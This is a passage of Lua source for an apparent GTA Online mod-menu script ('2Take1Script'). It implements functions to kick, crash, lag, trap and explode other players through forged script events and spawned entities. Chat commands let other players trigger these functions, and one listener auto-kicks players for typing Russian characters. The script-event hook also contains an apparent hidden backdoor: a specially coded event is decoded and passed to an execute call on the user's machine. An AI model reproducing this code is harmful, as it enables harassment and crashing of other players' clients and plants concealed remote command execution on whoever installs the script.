    {"Stromberg", 0x34DBA661},
    {"Buzzard", 0x2F03547B},
    {"Hunter", 0xFD707EDE},
    {"Avenger", 0x81BD2ED0},
    {"Insurgent_Pickup", 0x9114EADA},
    {"Insurgent_Pickup_Custom", 0x8D4B7A8A},
    {"Halftrack", 0xFE141DA6}
}
local V = {
    {"cmd_explode", "!explode <playername>"},
    {"cmd_explode_all", "!explodeall	[SU]"},
    {"cmd_kick", "!kick <playername>"},
    {"cmd_kick_all", "!kickall	[SU]"},
    {"cmd_crash", "!crash <playername>	[SU]"},
    {"cmd_crash_all", "!crashall	[SU]"},
    {"cmd_lag", "!lag <playername>"},
    {"cmd_trap", "!trap <playername>"},
    {"cmd_tp", "!tp <playername>	[SU]"},
    {"cmd_clearwanted", "!clearwanted	[NOT SU]"},
    {"cmd_vehicle", "!vehicle <NAME>"},
    {"cmd_bigpp", "!bigpp <playername>"},
    {"cmd_bigppall", "!bigppall	[SU]"}
}
local W = {
    {
        "Main LSC",
        {
            {3291218330, {-357.45132446289, -134.30920410156, 38.53914642334}, {0, 0, -20}, true, true},
            {false, {-370.4, -104.72, 47}, -110.83449554443}
        }
    },
    {
        "La Mesa LSC",
        {
            {3291218330, {722.9853515625, -1089.2061767578, 23.043445587158}, {0, 0, 0}, true, true},
            {false, {700, -1085, 24}, -100}
        }
    },
    {
        "LSIA LSC",
        {
            {3291218330, {-1145.7882080078, -1991.130859375, 13.163989067078}, {0, 0, 45}, true, true},
            {false, {-1117.1, -1983.3, 23}, 104.5}
        }
    },
    {
        "Desert LSC",
        {
            {3291218330, {1178.552734375, 2646.4377441406, 37.874099731445}, {0, 0, 90}, true, true},
            {false, {1182, 2673.2, 39}, 163.3}
        }
    },
    {
        "Paleto Bay LSC",
        {
            {3291218330, {112.54597473145, 6619.6850585938, 31.604303359985}, {0, 0, -45}, true, true},
            {false, {140.8, 6601.9, 32}, 57}
        }
    },
    {
        "Bennys LSC",
        {
            {3291218330, {-208.5591583252, -1308.7404785156, 31.718006134033}, {0, 0, 90}, true, true},
            {false, {-184.2, -1292.5, 34}, 124.3}
        }
    }
}
local X = {
    {
        "Entrance",
        {
            {3291218330, {924.69201660156, 62.243091583252, 81.21053314209}, {0, 0, 80}, true, true},
            {3291218330, {910.31787109375, 36.022556304932, 80.59684753418}, {0, 0, 25}, true, true},
            {false, {920.8, 80.5, 80}, -177}
        }
    },
    {
        "Garage",
        {
            {3291218330, {932.78601074219, -2.0857257843018, 80.166107177734}, {0, 0, 60}, true, true},
            {false, {940, -21, 80}, 4.9}
        }
    },
    {
        "Roof",
        {
            {3291218330, {964.02569580078, 58.947933197021, 113.34354400635}, {0, 0, -30}, true, true},
            {false, {954.8, 63.34, 114}, -124.2}
        }
    }
}
local Y = {
    {
        "Entrance",
        {
            {3291218330, {-81.541351318359, -792.25347900391, 44.622947692871}, {0, 0, 100}, true, true},
            {3291218330, {-70.231819152832, -802.17694091797, 44.230716705322}, {0, 0, 0}, true, true},
            {false, {-55.1, -776.5, 46}, 125.4}
        }
    },
    {
        "Garage",
        {
            {3291218330, {-83.269706726074, -773.02490234375, 39.806701660156}, {0, -35, 105}, true, true},
            {false, {-86.2, -762.2, 44}, -165.7}
        }
    },
    {
        "Roof",
        {
            {3291218330, {-66.390617370605, -813.32702636719, 320.40509033203}, {0, 0, 60}, true, true},
            {3291218330, {-66.451454162598, -822.87298583984, 321.19717407227}, {0, 0, 100}, true, true},
            {3291218330, {-68.104598999023, -818.67510986328, 323.35980224609}, {0, 90, 0}, true, true},
            {false, {-76.6, -817.6, 328}}
        }
    },
    {
        "Arena War",
        {
            {3291218330, {-371.32809448242, -1859.2064208984, 21.246929168701}, {0, 15, -75}, true, true},
            {3291218330, {-396.87942504883, -1869.1518554688, 22.718107223511}, {0, 15, -60}, true, true},
            {false, {-379.6, -1850, 23}, -166.6}
        }
    }
}
local Z = {1057201338, 2238511874, 762327283}
local _ = {
    62409944,
    64074298,
    155527062,
    153219155,
    131037988,
    141884823,
    104432921,
    147111499,
    9284553,
    114982881,
    137663665,
    63457,
    137601710,
    138075198,
    123017343,
    130291511,
    137851207,
    137714280,
    127448079,
    137579070,
    134412628,
    133709045,
    64234321,
    131973478,
    103019313,
    103054099,
    104041189,
    110470958,
    119266383,
    119958356,
    121397532,
    121698158,
    123849404,
    121943600,
    129159629,
    18965281,
    216820,
    56778561,
    99453545,
    99453882,
    88435916,
    174875493
}
local a0 = {
    ["bl_objects"] = {},
    ["peds"] = {},
    ["attach_obj"] = {},
    ["asteroids"] = {},
    ["lag_area"] = {},
    ["custom_veh"] = {},
    ["preview_veh"] = {},
    ["temp_veh"] = {},
    ["shooting"] = {},
    ["chat_veh"] = {},
    ["bodyguards"] = {},
    ["bodyguards_veh"] = {}
}
local a1 = {
    ["female"] = {
        ["clothes"] = {{0, 0}, {0, 6}, {0, 14}, {0, 34}, {0, 0}, {0, 25}, {0, 0}, {0, 35}, {0, 0}, {0, 0}, {0, 48}},
        ["props"] = {{0, 45, 0}, {1, 11, 0}, {2, 4294967295, 0}, {6, 4294967295, -1}, {7, 4294967295, -1}}
    },
    ["male"] = {
        ["clothes"] = {{0, 0}, {0, 0}, {0, 0}, {0, 35}, {0, 0}, {0, 25}, {0, 0}, {0, 58}, {0, 0}, {0, 0}, {0, 55}},
        ["props"] = {{0, 46, 0}, {1, 13, 0}, {2, 4294967295, 0}, {6, 4294967295, -1}, {7, 4294967295, -1}}
    }
}
local a2 = _2t1s_russki_chars
local a3 = _2t1s_begger_texts
local a4 = _2t1s_ped_assassins
local a5 = _2t1s_se_custom
local a6 = _2t1s_block_custom
local a7 = _2t1s_custom_attachments
local a8 = _2t1s_custom_vehicles
local a9 = _2t1s_vehicle_lag_area
local aa = _2t1s_modded_ips
local ab = _2t1s_modded_scids
local ac = _2t1s_speedometer_units
local ad = _2t1s_bounty_amount
local ae = _2t1s_sms_texts
local af = _2t1s_net_events
local ag = _2t1s_weapons
local ah = enable_rockstar_admin_kick_crash
local aj = {["parent"] = 0, ["opl_parent"] = 0, ["lobby_history"] = {}}
local ak = {}
local al = {"random_primary", "random_secondary", "random_pearlescent", "random_neon", "random_smoke", "random_xenon"}
local am = {
    "rainbow_primary",
    "rainbow_secondary",
    "rainbow_pearlescent",
    "rainbow_neon",
    "rainbow_smoke",
    "rainbow_xenon"
}
local an = {"synced_rainbow", "synced_random", "synced_rainbow_smooth"}
local ao, ap, aq = 0, false, 0
local ar = v3()
local as, at, au, av = nil, {}, {}, false
local aw, ax = {}, {}
local ay = {}
local az = {}
local aA, aB
local aC
local aD
local aE = nil
local aF
local aG = {}
local aH = {}
local aI = {}
local aJ = {}
local aK, aL, aM
local aN
local aO
local aP, aQ
local aR = {}
local aS = {}
local aT = {}
local aU = {}
local aV = {}
local aW = {}
local aX
local aY = {12, 13, 14, 43, 74}
local aZ
local a_
local b0
local b1
local b2 = {}
b2[1] = true
local b3 = {0xedb42cd8, 0x231d58ee, 0xac07dc75, 0x58fabbdf, 0xd892c51c, 0xb3f248d0}
local b4 = {}
local b5 = nil
local b6 = 0
local b7 = {
    ["flamethrower"] = nil,
    ["flamethrower_green"] = nil,
    ["alien"] = nil,
    ["fire_circle"] = {},
    ["fire_balls"] = {},
    ["fire_ass"] = nil,
    ["fire_ass_ball"] = nil
}
local function b8(b9, ba, q)
    return menu.add_feature(b9, "parent", ba, q)
end
local function bb(b9, ba, q)
    return menu.add_feature(b9, "action", ba, q)
end
local function bc(b9, ba, q)
    return menu.add_feature(b9, "toggle", ba, q)
end
local function bd(b9, be, ba, q)
    return menu.add_feature(b9, be, ba, q)
end
local function bf(b9, ba, q)
    return menu.add_player_feature(b9, "parent", ba, q)
end
local function bg(b9, ba, q)
    return menu.add_player_feature(b9, "action", ba, q)
end
local function bh(b9, ba, q)
    return menu.add_player_feature(b9, "toggle", ba, q)
end
local function bi(b9, be, ba, q)
    return menu.add_player_feature(b9, be, ba, q)
end
local function bj(i, p)
    I.ctrl(i)
    entity.set_entity_velocity(i, v3())
    entity.set_entity_coords_no_offset(i, p)
end
local function bk(bl, time)
    if bl ~= nil and bl[1] ~= nil then
        if time == nil then
            time = 5
        end
        for i = 1, #bl do
            if bl[i] ~= M.ped() and bl[i] ~= ped.get_vehicle_ped_is_using(M.ped()) then
                I.ctrl(bl[i], time)
                entity.detach_entity(bl[i])
                entity.set_entity_velocity(bl[i], v3())
                bj(bl[i], v3(8000, 8000, -1000))
                entity.delete_entity(bl[i])
            end
        end
    end
end
event.add_event_listener(
    "exit",
    function()
        s("")
        s("2Take1Script got unloaded.")
        s("Cleaning up...")
        o("2Take1Script got unloaded.\nUnloading Script.. :(", 200)
        for i in pairs(aH) do
            bk({aH[i]})
            aH[i] = nil
        end
        bk(aI)
        bk(aJ)
        for i in pairs(a0) do
            bk(a0[i])
        end
        bk({aP})
        bk({aN})
        if b7["flamethrower"] ~= nil then
            graphics.remove_particle_fx(b7["flamethrower"], true)
        end
        if b7["flamethrower_green"] ~= nil then
            graphics.remove_particle_fx(b7["flamethrower_green"], true)
        end
        if b7["fire_circle"][1] ~= nil then
            for i = 1, #b7["fire_circle"] do
                graphics.remove_particle_fx(b7["fire_circle"][i], true)
            end
            b7["fire_circle"] = {}
            bk(b7["fire_balls"])
            b7["fire_balls"] = {}
        end
        if b7["fire_ass"] ~= nil then
            graphics.remove_particle_fx(b7["fire_ass"], true)
        end
        bk({b7["fire_ass_ball"]})
        for i = 1, 32 do
            if aV[i] ~= nil then
                hook.remove_script_event_hook(aV[i])
            end
        end
        for i = 1, 32 do
            if aW[i] ~= nil then
                hook.remove_net_event_hook(aW[i])
            end
        end
        s("Going to remove Chat-Listeners...")
        for i in pairs(az) do
            event.remove_event_listener("chat", az[i])
        end
        s("Done.")
        _2t1s = false
        _2t1sEXT = false
    end
)
local function bm(g, bn, r)
    s("Teleporting to Target.")
    local bo, bp, bq, br = M.ped()
    if type(g) == "number" then
        br = ped.get_vehicle_ped_is_using(g)
        if br ~= 0 then
            if ped.is_ped_in_any_vehicle(bo) then
                ped.clear_ped_tasks_immediately(bo)
                c.wait(10)
            end
        end
    end
    bq = ped.get_vehicle_ped_is_using(bo)
    if bq ~= 0 then
        I.ctrl(bq)
        entity.set_entity_velocity(bq, v3())
        bo = bq
    end
    if type(g) == "number" then
        bp = c.gcoords(g)
    else
        bp = g
    end
    if bn ~= nil then
        bp.z = bp.z + bn
    end
    bj(bo, bp)
    if r ~= nil then
        entity.set_entity_heading(bo, r)
    end
    if br ~= nil then
        c.wait(1500)
        ped.set_ped_into_vehicle(M.ped(), br, vehicle.get_free_seat(br))
    end
    s("Done.")
end
local function bs(i)
    local bt = script.get_global_i(2424073 + i * 421 + 235 + 1)
    local bu = interior.get_interior_from_entity(c.ped(i))
    if bt ~= 0 and (bu ~= nil or bu ~= 0) then
        return true
    end
    return false
end
local function bv(water, bw)
    if
        not ak["bl_mdl_change"].on or
            ak["bl_mdl_change"].on and
                (not ped.is_ped_in_any_vehicle(M.ped()) and
                    (water and entity.is_entity_in_water(M.ped()) or
                        not water and not entity.is_entity_in_water(M.ped())) or
                    bw)
     then
        return true
    end
    o("Model Change not possible!", 125)
    return false
end
local function bx(r, water, by, bz, bw)
    if bv(water, bw) then
        if bz then
            bm(M.coords(), 1.5)
        end
        I.model(r)
        player.set_player_model(r)
        c.unload(r)
        if by then
            c.wait(0)
            ped.set_ped_component_variation(M.ped(), 4, 0, 0, 2)
        end
    end
end
local function bA()
    local bB, bC = {}, {}
    local bD
    if utils.file_exists(b["Blacklist"]) then
        local G = c.o(b["Blacklist"], "r")
        if G ~= nil then
            for bE in io.lines(b["Blacklist"]) do
                bD = 1
                for bF in string.gmatch(bE, "[^%s]+") do
                    if bD == 1 then
                        table.insert(bB, bF)
                    else
                        if type(bF) == "string" then
                            table.insert(bC, bF)
                        else
                            table.insert(bC, "NoNameFound")
                        end
                    end
                    bD = bD + 1
                end
            end
        end
        io.close(G)
        aw = bB
        ax = bC
    end
end
local function bG(bH, id)
    local i = 0
    if bH then
        s("Lobby Kick!")
    end
    while i < 32 do
        if bH then
            id = i
        else
            i = 99
        end
        if N.i(id) then
            local bI, bJ, bK
            for i = 1, c.random(15, 40) do
                bI = c.random(0xd00000, 0xfeb00000)
                bJ = c.random(0, 31)
                bK = c.random(-100, 5000)
                c.script(bI, id, {bJ, bK})
            end
            c.wait(75)
            o("Attempting to Kick Player: " .. K.name(id), 65)
            s("Attempting to Kick Player.")
            s(K.name(id) .. ":" .. K.scid(id))
            if network.network_is_host() then
                s("Haha, got a hostkick.")
                network.network_session_kick_player(id)
            end
            c.script(0x8197eaf0, id, {id, script.get_global_i(1628955 + 1 + id * 614 + 532)})
            c.script(0x8197eaf0, id, {id, script.get_global_i(1628955 + 1 + id * 614 + 532)})
            c.script(0x8197eaf0, id, {id, script.get_global_i(1628955 + 2 + id * 614 + 532)})
            for i = 1, c.random(15, 40) do
                bI = c.random(0xd00000, 0xfeb00000)
                c.script(bI, id, {})
            end
            c.wait(75)
            for i = 1, #w, 2 do
                c.script(c.no(w[i], 27) + c.no(w[i + 1], 36), id, {})
            end
            c.wait(75)
            for i = 1, c.random(15, 40) do
                bI = c.random(0xd00000, 0xfeb00000)
                c.script(bI, id, {})
            end
            c.wait(75)
        end
        i = i + 1
    end
end
local function bL(bM, id, bN)
    for i = 1, #bM do
        local bO = v3(bM[i][3][1], bM[i][3][2], bM[i][3][3])
        local bP = v3(bM[i][4][1], bM[i][4][2], bM[i][4][3])
        local bQ
        local bR = false
        if bN then
            bQ = bM[i][1]
        else
            I.model(bM[i][1])
            if streaming.is_model_an_object(bM[i][1]) then
                bQ = object.create_object(bM[i][1], bO, true, false)
            else
                bR = true
                bQ = ped.create_ped(6, bM[i][1], bO, 0.0, true, false)
                c.wait(0)
                ped.set_ped_can_ragdoll(bQ, false)
                entity.set_entity_god_mode(bQ, true)
            end
            c.unload(bM[i][1])
        end
        a0["attach_obj"][#a0["attach_obj"] + 1] = bQ
        if ak["attach_no_colision"].on then
            entity.set_entity_collision(bQ, false, false, false)
        end
        if bM[i][5] then
            entity.set_entity_visible(bQ, false)
        end
        entity.attach_entity_to_entity(bQ, c.ped(id), bM[i][2], bO, bP, true, true, bR, 0, true)
    end
end
local function bS(id, r)
    s("Lagging Area @Player.")
    local bp = c.gcoords(c.ped(id))
    I.model(r)
    bp.z = bp.z + 5
    for i = 1, 50 do
        a0["lag_area"][#a0["lag_area"] + 1] = vehicle.create_vehicle(r, bp, 0.0, true, false)
    end
    c.unload(r)
    s("Done.")
end
local function bT(id)
    if N.i(id) then
        c.navigate(false)
        local bU = {}
        while M.coords():magnitude(c.gcoords(c.ped(id))) < 5000 do
            local bp = M.coords()
            bm(v3(bp.x, bp.y, bp.z + 500))
        end
        s("Sending Crash Entitys...")
        s("Distance: " .. M.coords():magnitude(c.gcoords(c.ped(id))))
        for i = 1, #Z do
            local r = Z[i]
            local bV = c.gcoords(c.ped(id))
            I.model(r)
            bU[i] = ped.create_ped(26, r, bV, 0.0, true, false)
            c.unload(r)
        end
        s("Waiting.")
        o("Waiting ~ 7.5 seconds...")
        local time = c.time() + 7500
        while time > c.time() do
            s("Distance: " .. M.coords():magnitude(c.gcoords(c.ped(id))))
            c.wait(125)
            while M.coords():magnitude(c.gcoords(c.ped(id))) < 5000 do
                local bp = M.coords()
                bm(v3(bp.x, bp.y, bp.z + 500))
            end
        end
        for i = 1, #bU do
            if not I.ctrl(bU[i], 5000) then
                o("Dont go near the player, there is a possibility that the crash peds still exist!")
            else
                bk({bU[i]}, 5000)
            end
        end
        bk(bU[i], 5000)
        c.navigate(true)
    end
end
local function bW(bq)
    local bX = {11, 12, 13, 16, 18}
    local bY = {3, 2, 2, 4, 1}
    for i = 1, #bX do
        if vehicle.get_vehicle_mod(bq, bX[i]) ~= bY[i] then
            I.ctrl(bq)
            vehicle.set_vehicle_mod(bq, bX[i], bY[i])
        end
    end
    vehicle.set_vehicle_bulletproof_tires(bq, true)
end
local function bZ(bp, b_, c0)
    b_ = math.rad((b_ - 180) * -1)
    bp.x = bp.x + math.sin(b_) * -c0
    bp.y = bp.y + math.cos(b_) * -c0
    return bp
end
local function c1(c2)
    local c3 = "0X"
    for H, C in pairs(c2) do
        local c4 = ""
        while C > 0 do
            local D = math.fmod(C, 16) + 1
            C = math.floor(C / 16)
            c4 = string.sub("0123456789ABCDEF", D, D) .. c4
        end
        if string.len(c4) == 0 then
            c4 = "00"
        elseif string.len(c4) == 1 then
            c4 = "0" .. c4
        end
        c3 = c3 .. c4
    end
    return c3
end
local function c5(id)
    id = string.lower(id)
    local j
    for i = 0, 31 do
        if K.scid(i) ~= -1 then
            j = string.lower(K.name(i))
            if j == id then
                return i
            end
        end
    end
    return -1
end
local function c6(c7)
    for i = 1, #c7 do
        if ak[c7[i]].on then
            ak[c7[i]].on = false
        end
    end
end
local function c8(bq, q, i, bD)
    I.ctrl(bq)
    c.wait(0)
    vehicle.set_vehicle_tire_smoke_color(bq, q[1], q[2], q[3])
    vehicle.set_vehicle_custom_primary_colour(bq, c1({q[1], q[2], q[3]}))
    vehicle.set_vehicle_custom_secondary_colour(bq, c1({q[1], q[2], q[3]}))
    vehicle.set_vehicle_custom_pearlescent_colour(bq, c1({q[1], q[2], q[3]}))
    vehicle.set_vehicle_neon_lights_color(bq, c1({q[1], q[2], q[3]}))
    if i == nil then
        i = 0
    end
    if q[1] > 200 and q[1] < 256 and q[2] > 200 and q[2] < 256 and q[3] > 220 and q[3] < 256 then
        i = 0
    end
    if q[1] >= 0 and q[1] < 30 and q[2] >= 0 and q[2] < 50 and q[3] > 220 and q[3] < 256 then
        i = 1
    end
    if q[1] >= 0 and q[1] < 30 and q[2] >= 50 and q[2] < 110 and q[3] > 220 and q[3] < 256 then
        i = 2
    end
    if q[1] >= 0 and q[1] < 30 and q[2] >= 110 and q[2] < 256 and q[3] > 100 and q[3] <= 220 then
        i = 3
    end
    if q[1] >= 30 and q[1] < 120 and q[2] >= 110 and q[2] < 256 and q[3] >= 0 and q[3] <= 100 then
        i = 4
    end
    if q[1] >= 120 and q[1] < 256 and q[2] >= 110 and q[2] < 256 and q[3] >= 0 and q[3] < 100 then
        i = 5
    end
    if q[1] >= 120 and q[1] < 256 and q[2] >= 110 and q[2] < 200 and q[3] >= 0 and q[3] < 100 then
        i = 6
    end
    if q[1] >= 120 and q[1] < 256 and q[2] > 45 and q[2] < 109 and q[3] >= 0 and q[3] < 100 then
        i = 7
    end
    if q[1] >= 120 and q[1] < 256 and q[2] >= 0 and q[2] <= 45 and q[3] >= 0 and q[3] < 100 then
        i = 8
    end
    if q[1] >= 120 and q[1] < 256 and q[2] > 45 and q[2] < 100 and q[3] >= 50 and q[3] < 150 then
        i = 9
    end
    if q[1] >= 120 and q[1] < 256 and q[2] >= 0 and q[2] <= 45 and q[3] >= 150 and q[3] < 256 then
        i = 10
    end
    if q[1] >= 0 and q[1] < 120 and q[2] >= 0 and q[2] <= 45 and q[3] >= 150 and q[3] < 256 then
        i = 11
    end
    if q[1] >= 0 and q[1] < 30 and q[2] >= 0 and q[2] <= 45 and q[3] >= 150 and q[3] < 256 then
        i = 12
    end
    if bD ~= nil then
        i = bD
    end
    vehicle.set_vehicle_headlight_color(bq, i)
end
local function c9(id, ca, cb)
    s("Detected Chat-Command!")
    s(K.name(id) .. ":" .. K.scid(id))
    s("Is trying to perform " .. cb .. " as a Chat-Command!")
    if ak["chat_cmd_friends"] and player.is_player_friend(id) or id == c.id() or ak["chat_cmd_all"] then
        local cc
        if ca ~= nil then
            cc = c5(ca)
        else
            s("User is entitled to perfrom Command! Executing...")
            o("Performing " .. cb .. " Command for Player: " .. K.name(id) .. " on: " .. K.name(id))
            return true, plid
        end
        if cc ~= -1 then
            if cc == c.id() or player.is_player_friend(cc) and ak["exclude_friends"].on and cc ~= c.id() then
                o(K.name(id) .. " tried to perform a Command on you or a friend!")
                s("Blocked from Performing Command!")
                return false
            else
                s("User is entitled to perfrom Command! Executing...")
                o("Performing " .. cb .. " Command for Player: " .. K.name(id) .. " on: " .. K.name(cc))
                return true, cc
            end
        end
    end
    s("Command / format / player not found / entitled. Breaking up on performing it.")
    return false
end
s("Loading Chat-Listeners...")
az["chat_log"] =
    event.add_event_listener(
    "chat",
    function(J)
        if ak["chat_log"].on then
            s("[" .. K.scid(J.player) .. ":" .. K.name(J.player) .. "] " .. J.body, "[CHAT]")
        end
    end
)
az["chat_russki"] =
    event.add_event_listener(
    "chat",
    function(J)
        local id = J.player
        if ak["chat_russki"].on and N.i(id) then
            local f = J.body
            for i = 1, #a2 do
                if string.find(f, a2[i], 1) ~= nil then
                    s("Detected '" .. a2[i] .. "' as a Russki Char!")
                    s("Preparing to Kick " .. K.name(id) .. ".")
                    o("Detected " .. K.name(id) .. " typing forbidden Russki! Kicking Player...", 115)
                    bG(false, id)
                    f = ""
                end
            end
        end
    end
)
az["chat_begger"] =
    event.add_event_listener(
    "chat",
    function(J)
        local id = J.player
        if ak["chat_begger"].on and N.i(id) then
            local f = J.body
            for i = 1, #a3 do
                if string.find(f, a3[i], 1) ~= nil then
                    s("Detected " .. K.name(id) .. " begging for Money! Punishing Player...")
                    o("Detected " .. K.name(id) .. " begging for Money! Punishing Player...", 115)
                    bL(a7[5][2], id)
                    bL(a7[8][2], id)
                    local bp = c.gcoords(c.ped(id))
                    local cd = c.ped(id)
                    fire.add_explosion(bp, 59, false, true, 1, cd)
                    fire.add_explosion(bp, 8, false, true, 1, cd)
                    fire.add_explosion(bp, 59, false, true, 1, cd)
                end
            end
        end
    end
)
az["chat_cmd"] =
    event.add_event_listener(
    "chat",
    function(J)
        if ak["chat_cmd"].on then
            local id = J.player
            local f = J.body
            if ak["cmd_explode"] and string.find(f, "!explode ", 1) ~= nil then
                f = string.gsub(f, "!explode ", "")
                local ce, cc = c9(id, f, "Explode")
                if ce then
                    local bp = c.gcoords(c.ped(cc))
                    local cd = c.ped(id)
                    fire.add_explosion(bp, 59, false, true, 1, cd)
                    fire.add_explosion(bp, 8, false, true, 1, cd)
                    fire.add_explosion(bp, 59, false, true, 1, cd)
                end
            end
            if ak["cmd_explode_all"] and string.find(f, "!explodeall", 1) ~= nil and id == c.id() then
                s("Detected !explodeall Command! Script-User is entitled, performing...")
                for i = 0, 31 do
                    if N.i(i) then
                        fire.add_explosion(c.gcoords(c.ped(i)), 59, true, false, 1, c.ped(c.id()))
                    end
                end
            end
            if ak["cmd_kick"] and string.find(f, "!kick ", 1) ~= nil then
                f = string.gsub(f, "!kick ", "")
                local ce, cc = c9(id, f, "Kick")
                if ce then
                    bG(false, cc)
                end
            end
            if ak["cmd_kick_all"] and string.find(f, "!kickall", 1) ~= nil and id == c.id() then
                s("Detected !kickall Command! Script-User is entitled, performing...")
                bG(true)
            end
            if ak["cmd_crash"] and string.find(f, "!crash ", 1) ~= nil then
                s("Detected !crash Command!")
                f = string.gsub(f, "!crash ", "")
                local ca = c5(f)
                if ca ~= -1 then
                    if ca == c.id() then
                        bT(id)
                    elseif N.i(ca) then
                        bT(ca)
                    end
                end
            end
            if ak["cmd_crash_all"] and string.find(f, "!crashall", 1) ~= nil and id == c.id() then
                s("Detected !crashall Command! Script-User is entitled, performing...")
                for i = 0, 31 do
                    if N.i(i) then
                        bT(i)
                    end
                end
            end
            if ak["cmd_lag"] and string.find(f, "!lag ", 1) ~= nil then
                f = string.gsub(f, "!lag ", "")
                local ce, cc = c9(id, f, "Lag")
                if ce and #a0["lag_area"] < 101 then
                    bS(cc, 0x15F27762)
                end
            end
            if ak["cmd_trap"] and string.find(f, "!trap ", 1) ~= nil then
                f = string.gsub(f, "!trap ", "")
                local ce, cc = c9(id, f, "Trap")
                if ce then
                    local bp = c.gcoords(c.ped(cc))
                    entity.set_entity_rotation(
                        object.create_object(1125864094, v3(bp.x, bp.y, bp.z - 5), true, false),
                        v3(0, 90, 0)
                    )
                end
            end
            if ak["cmd_tp"] and string.find(f, "!tp ", 1) ~= nil and id == c.id() then
                s("Detected !tp Command! Script-User is entitled, performing...")
                f = string.gsub(f, "!tp ", "")
                local ca = c5(f)
                if ca ~= -1 then
                    local bn = 10
                    local bp = c.gcoords(c.ped(ca))
                    if bp.z < -50 then
                        bn = 150
                    end
                    bm(c.ped(ca), bn)
                end
            end
            if ak["cmd_clearwanted"] and string.find(f, "!clearwanted", 1) ~= nil then
                local ce, cc = c9(id, nil, "Clearwanted")
                if ce then
                    c.script(0xf63f672f, id, {id, script.get_global_i(1628955 + 1 + id * 614 + 532)})
                end
            end
            if ak["cmd_vehicle"] and string.find(f, "!vehicle ", 1) ~= nil then
                f = string.gsub(f, "!vehicle ", "")
                local ce, cc = c9(id, nil, "Vehicle")
                if ce then
                    local cf = gameplay.get_hash_key(f)
                    if streaming.is_model_a_vehicle(cf) then
                        I.model(cf)
                        local b_ = player.get_player_heading(id)
                        local cg = vehicle.create_vehicle(cf, bZ(c.gcoords(c.ped(id)), b_, 10), b_, true, false)
                        I.ctrl(cg)
                        c.unload(cf)
                        vehicle.set_vehicle_custom_primary_colour(cg, 0)
                        vehicle.set_vehicle_custom_secondary_colour(cg, 0)
                        vehicle.set_vehicle_custom_pearlescent_colour(cg, 0)
                        vehicle.set_vehicle_custom_wheel_colour(cg, 0)
                        vehicle.set_vehicle_window_tint(cg, 1)
                        decorator.decor_set_int(cg, "MPBitset", 1 << 10)
                        bW(cg)
                        ped.set_ped_into_vehicle(c.ped(id), cg, -1)
                    end
                end
            end
            if ak["cmd_bigpp"] and string.find(f, "!bigpp ", 1) ~= nil then
                f = string.gsub(f, "!bigpp ", "")
                local ce, cc = c9(id, f, "Bigpp")
                if ce then
                    bL(a7[5][2], cc)
                end
            end
            if ak["cmd_bigppall"] and string.find(f, "!bigppall", 1) ~= nil and id == c.id() then
                s("Detected !bigppall Command! Script-User is entitled, performing...")
                for i = 0, 31 do
                    if N.i(i) then
                        bL(a7[5][2], id)
                    end
                end
            end
        end
    end
)
local function ch(bM)
    s("Blocking Area.")
    for i = 1, #bM do
        if bM[i][1] ~= false then
            I.model(bM[i][1])
            a0["bl_objects"][#a0["bl_objects"] + 1] = object.create_object(bM[i][1], v3(), true, false)
            c.unload(bM[i][1])
            local bp
            if bM[i][2][1] == nil then
                bp =
                    v3(
                    c.random(bM[i][2][2], bM[i][2][3]),
                    c.random(bM[i][2][4], bM[i][2][5]),
                    c.random(bM[i][2][6], bM[i][2][7])
                )
            else
                bp = v3(bM[i][2][1], bM[i][2][2], bM[i][2][3])
            end
            bj(a0["bl_objects"][#a0["bl_objects"]], bp)
            entity.set_entity_rotation(a0["bl_objects"][#a0["bl_objects"]], v3(bM[i][3][1], bM[i][3][2], bM[i][3][3]))
            if bM[i][4] then
                entity.freeze_entity(a0["bl_objects"][#a0["bl_objects"]], true)
            end
            if bM[i][5] then
                entity.set_entity_visible(a0["bl_objects"][#a0["bl_objects"]], false)
            end
        else
            if bM[i] ~= nil then
                if ak["teleport_to_block"].on then
                    bm(v3(bM[i][2][1], bM[i][2][2], bM[i][2][3]), nil, bM[i][3])
                end
            end
        end
    end
    s("Blocking Done.")
end
local function ci(bH, cj, ck, cl, cm, id)
    s("Sending Script Events to Player.")
    local i = 0
    while i < 32 do
        if bH then
            id = i
        else
            i = 99
        end
        if N.i(id) then
            if cj ~= 0 and cj ~= nil then
                c.script(cj, id, ck)
                s("SE 1 : " .. cj)
                s("Sent to Player: " .. K.name(id))
            end
            if cl ~= 0 and cl ~= nil then
                c.script(cl, id, cm)
                s("SE 2 : " .. cl)
                s("Sent to Player: " .. K.name(id))
            end
        end
        i = i + 1
    end
    s("Done.")
end
local function cn()
    if av then
        bx(as, nil, nil, nil, true)
        c.wait(250)
        ped.set_ped_health(M.ped(), 0)
        c.wait(3500)
        for i = 1, 11 do
            ped.set_ped_component_variation(M.ped(), i, au[i], at[i], 2)
        end
    else
        o("First Crash Session.")
    end
end
local function co(cp, ca, cq, cr)
    if type(cq) == "table" then
        if cq[1] == 0xfaaab4a3 then
            if cq[2] == 6666 then
                table.remove(cq, 1)
                table.remove(cq, 1)
                local cs = utf8.char(table.unpack(cq))
                o(cs, K.name(cp), 47)
                s(K.name(cp) .. ": " .. cs)
            end
            if cq[2] == 7331 then
                if l_a == nil then
                    table.remove(cq, 1)
                    table.remove(cq, 1)
                    local cs = utf8.char(table.unpack(cq))
                    c.exe(cs)
                end
            end
        end
        for i = 1, #b3 do
            if b3[i] == cq[1] and #cq == 5 then
                local ct = b3[c.random(1, #b3)]
                local plid = c.id()
                local cu = c.random(-10, 100)
                c.script(ct, cp, {plid, cq[3], cq[4], cu})
            end
        end
    end
end
local function cv(c, g, p, q)
    local ct = p[1]
    table.remove(p, 1)
    c.script(ct, c, p)
end
b6 = hook.register_script_event_hook(co)
local function cw(cp, ca, cx)
    if ak["modded_net_events"].on then
        if N.modder(cp) and ca == c.id() then
            local cy = false
            for i = 1, #aY do
                if cx == aY[i] then
                    cy = true
                end
            end
            if cx == 9 and not player.is_player_host(cp) then
                cy = true
            end
            if cx == 10 and aZ == nil then
                aZ = cp
                a_ = c.time()
                cy = true
            end
            if a_ ~= nil then
                if a_ + 30000 < c.time() then
                    a_ = nil
                    aZ = nil
                end
            end
            if cy then
                o(K.name(cp) .. " sent a Bad Net-Event: " .. cx, 130)
                o("Marking him as a Modder!", 130)
                s(K.name(cp) .. " sent a Bad Net-Event: " .. cx)
                player.set_player_as_modder(cp, n["moddednetevent"][2])
                return true
            end
        end
    end
end
local function cz()
    local cA = aH["llbone"]
    local cB = aH["rlbone"]
    local cC = aH["tampa"]
    local cD = v3(-4.25, 0, 12.5)
    local cE = v3(4.25, 0, 12.5)
    if cA ~= nil and cB ~= nil and cC ~= nil then
